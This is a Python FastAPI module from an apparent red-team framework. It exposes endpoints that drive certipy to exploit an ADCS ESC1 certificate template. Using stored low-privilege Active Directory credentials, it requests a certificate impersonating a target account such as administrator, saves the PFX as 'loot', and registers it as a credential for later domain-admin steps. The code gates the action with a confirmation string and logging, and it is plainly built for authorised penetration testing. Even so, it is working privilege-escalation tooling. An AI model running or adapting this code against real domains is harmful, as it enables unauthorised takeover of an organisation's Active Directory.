"""P1-7 — WebGUI endpoint for `attempt_esc1` (ADCS ESC1 auto-request).

Frontend at the AD attack-chain's `adcs_esc` step POSTs here to actually
request a certificate against a vulnerable ESC1 template. This wraps
`recce.ad.adcs_exploit.attempt_esc1` behind strict gating (see the
module-level docstring in `adcs_exploit.py` for the design rationale)
and, on success, folds the returned PFX into the recce credential store
as `Credential(kind="cert")` so downstream chain steps (`da_path`) see
it as an authenticator without a copy-paste from the operator.

Two endpoints:

* ``GET /api/adcs/esc1/available`` — snapshot the current state so the
  frontend can decide whether to render the "Attempt ESC1" affordance:
  ``{tool_installed: bool, tool_hint: str, matching_creds: [{
    username, domain, source, has_password, has_hash
  }]}``. Cheap; safe to poll.

* ``POST /api/adcs/esc1/attempt`` — actually invoke certipy. Body:
  ``{template, ca, dc_ip, domain, username, upn_target, confirm}``.
  Every field required. `confirm` must be the exact string
  ``"yes-run-certipy"`` (an intentional friction, not a boolean, so a
  stale/replayed request from a test fixture can't fire). The
  credential material (password / nthash) is NOT accepted in the body
  — recce looks up the matching Credential in its own store, so the
  WebGUI cannot spray arbitrary creds.
"""
from __future__ import annotations

import base64
import os
import time

from fastapi import Body, FastAPI, Header, HTTPException


# Exact string required in POST body.confirm — see module docstring.
_CONFIRM_SENTINEL = "yes-run-certipy"


def register_adcs_esc1_routes(app: FastAPI, ctx) -> None:
    db_path = ctx.db_path
    eng_dir = ctx.eng_dir
    broker = ctx.broker

    @app.get("/api/adcs/esc1/available")
    def esc1_available():
        """Snapshot the enabling state the frontend needs to decide
        whether to render the ESC1-attempt button + which credentials
        to offer as the requesting principal.

        Read-only. No side effects."""
        from ...ad import adcs_exploit
        from ...core.store import Store
        installed = adcs_exploit.is_certipy_installed()
        tool_hint = ("" if installed
                     else "install certipy: `pip install certipy-ad` "
                          "(or `pipx install certipy-ad`); recce shells "
                          "out to it at exploit time.")
        matching: list[dict] = []
        with Store(db_path) as st:
            for c in st.all_credentials():
                # Only offer credentials that name an AD account (either
                # has a domain OR the username includes a backslash /
                # UPN suffix). Local-service creds (mysql/postgres
                # source) aren't AD principals and wouldn't authenticate
                # to a CA.
                domain = (c.domain or "").strip()
                uname = (c.username or "").strip()
                looks_ad = bool(domain) or "\\" in uname or "@" in uname
                if not looks_ad:
                    continue
                if not (c.secret and c.kind in ("password", "nthash")):
                    continue
                matching.append({
                    "username": uname,
                    "domain": domain,
                    "source": c.source,
                    "origin_ip": c.origin_ip,
                    "has_password": c.kind == "password",
                    "has_hash": c.kind == "nthash",
                    "notes": c.notes,
                })
        return {"tool_installed": installed, "tool_hint": tool_hint,
                "matching_creds": matching,
                "confirm_sentinel": _CONFIRM_SENTINEL}

    @app.post("/api/adcs/esc1/attempt")
    def esc1_attempt(body: dict = Body(...),
                     x_tester: str = Header(default="someone")):
        """Actually invoke certipy req for the requested ESC1 template.

        Body (all fields required):
          template     — the vulnerable ADCS template name
          ca           — the CA name certipy needs to target
          dc_ip        — DC IP / hostname for LDAP + Kerberos
          domain       — AD DNS domain (e.g. corp.local)
          username     — the low-priv account that can enroll on this
                         template. MUST match a credential already in
                         the recce store (password OR nthash).
          upn_target   — the UPN whose identity we want to embed in
                         the certificate's SAN. Usually
                         `administrator@<domain>`.
          confirm      — MUST equal the exact string returned as
                         `confirm_sentinel` by /api/adcs/esc1/available.
        """
        from ...ad import adcs_exploit
        from ...core.models import Credential
        from ...core.store import Store
        from .. import collab

        # --- input validation ---------------------------------------
        required = ("template", "ca", "dc_ip", "domain", "username",
                    "upn_target", "confirm")
        missing = [k for k in required if not str(body.get(k, "")).strip()]
        if missing:
            raise HTTPException(400, f"missing required field(s): {missing}")
        if body["confirm"] != _CONFIRM_SENTINEL:
            raise HTTPException(
                400,
                f"confirm field must be the exact string {_CONFIRM_SENTINEL!r} "
                "(get it from GET /api/adcs/esc1/available). This is a "
                "T3-INTRUSIVE action — it creates a certificate on the "
                "target CA and generates audit event 4886.")

        template = body["template"].strip()
        ca = body["ca"].strip()
        dc_ip = body["dc_ip"].strip()
        domain = body["domain"].strip()
        username = body["username"].strip()
        upn_target = body["upn_target"].strip()

        # --- look up the requesting credential in the store ---------
        # The WebGUI cannot spray arbitrary creds — the password/hash
        # comes from what recce already knows about, not from the
        # request body.
        with Store(db_path) as st:
            candidates = [c for c in st.all_credentials()
                          if (c.username or "").strip().lower() == username.lower()
                          and (c.domain or "").strip().lower() == domain.lower()
                          and c.secret and c.kind in ("password", "nthash")]
        if not candidates:
            raise HTTPException(
                404,
                f"no credential in the store matches "
                f"({username}@{domain}) — add it first via "
                "POST /api/add/credential or run a spray that captures it.")
        # Prefer plaintext over hash (certipy 5.x is happier with -p).
        cred = next((c for c in candidates if c.kind == "password"),
                    candidates[0])

        # --- fire ----------------------------------------------------
        broker.publish({"type": "adcs_esc1_attempt", "template": template,
                        "ca": ca, "upn_target": upn_target,
                        "by": x_tester, "status": "running"})
        t0 = time.monotonic()
        try:
            result = adcs_exploit.attempt_esc1(
                user=username, password=(cred.secret if cred.kind == "password" else ""),
                nthash=(cred.secret if cred.kind == "nthash" else None),
                domain=domain, dc_ip=dc_ip, ca=ca, template=template,
                upn_target=upn_target)
        except Exception as e:                # noqa: BLE001 — defensive envelope
            elapsed = time.monotonic() - t0
            broker.publish({"type": "adcs_esc1_attempt", "template": template,
                            "ca": ca, "upn_target": upn_target,
                            "by": x_tester, "status": "error",
                            "elapsed_s": elapsed})
            raise HTTPException(500, f"adcs_exploit raised: {e}")

        # --- on success, fold the PFX into the credential store ----
        cert_credential_added = False
        pfx_saved_at = ""
        if result.ok:
            # Persist the PFX bytes to the engagement's session-loot
            # directory so the operator can grab the file later (the
            # tempdir certipy wrote it to will be gone after certipy's
            # cleanup on next run).
            loot_dir = os.path.join(eng_dir, "session-loot", "adcs")
            os.makedirs(loot_dir, exist_ok=True)
            safe_upn = "".join(ch if ch.isalnum() or ch in "._-@" else "_"
                               for ch in upn_target)[:80]
            pfx_saved_at = os.path.join(
                loot_dir, f"esc1_{safe_upn}_{int(time.time())}.pfx")
            try:
                with open(pfx_saved_at, "wb") as fh:
                    fh.write(base64.b64decode(result.pfx_b64))
            except OSError as e:
                pfx_saved_at = f"(save failed: {e})"

            # Add the cert to the store as Credential(kind="cert") so
            # downstream chain steps see the authenticator. `secret`
            # carries the on-disk path; the base64 blob stays out of
            # the SQLite row to keep the store lean.
            with Store(db_path) as st:
                cert_credential_added = st.add_credential(Credential(
                    username=upn_target.split("@")[0],
                    secret=pfx_saved_at,
                    kind="cert",
                    domain=domain,
                    source=f"adcs-esc1({template})",
                    origin_ip=dc_ip,
                    notes=(f"ESC1 cert requested by {x_tester} via CA {ca}, "
                           f"template {template}, as {username}@{domain}. "
                           f"PFX size {result.pfx_size} B.")))
                collab.add_activity(st, x_tester, "add",
                                    f"{x_tester} requested an ESC1 cert as "
                                    f"{upn_target} via CA {ca}/{template} "
                                    f"({result.pfx_size} B PFX saved)")

        broker.publish({"type": "adcs_esc1_attempt", "template": template,
                        "ca": ca, "upn_target": upn_target,
                        "by": x_tester,
                        "status": "ok" if result.ok else "failed",
                        "elapsed_s": result.elapsed_s})

        # --- reply --------------------------------------------------
        # Never leak the raw PFX bytes back over the API — the operator
        # picks it up from pfx_saved_at on the engagement filesystem.
        return {
            "ok": result.ok,
            "upn_requested": result.upn_requested,
            "template": result.template,
            "ca": result.ca,
            "dc_ip": result.dc_ip,
            "pfx_saved_at": pfx_saved_at,
            "pfx_size": result.pfx_size,
            "credential_added": cert_credential_added,
            "stdout_tail": result.stdout,
            "error": result.error,
            "returncode": result.returncode,
            "elapsed_s": result.elapsed_s,
            "argv_redacted": result.argv_redacted,
        }
